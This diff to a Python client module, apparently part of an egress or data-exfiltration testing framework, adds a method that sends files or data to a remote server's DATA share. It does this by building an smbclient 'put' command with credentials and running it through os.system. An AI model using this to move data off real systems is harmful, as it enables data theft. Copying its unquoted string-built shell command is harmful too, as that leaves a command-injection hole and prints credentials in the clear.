@@ -12,7 +12,6 @@ Finally, be sure to rename your client module to a .py file
 import os
 from common import helpers
 
-
 class Client:
 
     # Within __init__, you have access to everything passed in
@@ -31,6 +30,51 @@ class Client:
                 self.file_name = cli_object.file.split("/")[-1]
             else:
                 self.file_name = cli_object.file
+
+
+    def negotiatedTransmit(self, data_to_transmit,config=None):
+
+        self.username = config["smb"]["username"]
+        self.password = config["smb"]["password"]
+
+        print("[+] Sending SMB Data")
+
+        # find current directory, make directory for mounting share
+        # current directory
+        exfil_directory = os.path.join(os.getcwd(), "mount")
+        mount_path = exfil_directory + "/"
+
+        # Check to make sure the agent directory exists, and a loot
+        # directory for the agent.  If not, make them
+        if not os.path.isdir(mount_path):
+            os.makedirs(mount_path)
+
+        # Base command to copy file over smb
+        if self.username == "null" and self.password == "null":
+            smb_command = "smbclient \\\\\\\\" + self.remote_server + "\\\\DATA -N -c \"put "
+        else:
+            smb_command = "smbclient \\\\\\\\" + self.remote_server + "\\\\DATA -U " + self.username + " " +self.password +" -c \"put "
+
+        # If using a file, copy it, else write to disk and then copy
+        if not self.file_transfer:
+            smb_file_name = helpers.writeout_text_data(data_to_transmit)
+            smb_full_path = helpers.ea_path() + "/" + smb_file_name
+
+            smb_command += smb_file_name + "\""
+
+        else:
+            smb_command += self.file_transfer + " " + self.file_name + "\""
+            smb_file_name = self.file_transfer
+
+        print smb_command
+        os.system(smb_command)
+
+        if not self.file_transfer:
+            os.remove(smb_full_path)
+
+        print "[*] File Transmitted!"
+
+        return
 
     # transmit is the only required function within the object.  It is what
     # called by the framework to transmit data.  However, you can create as 
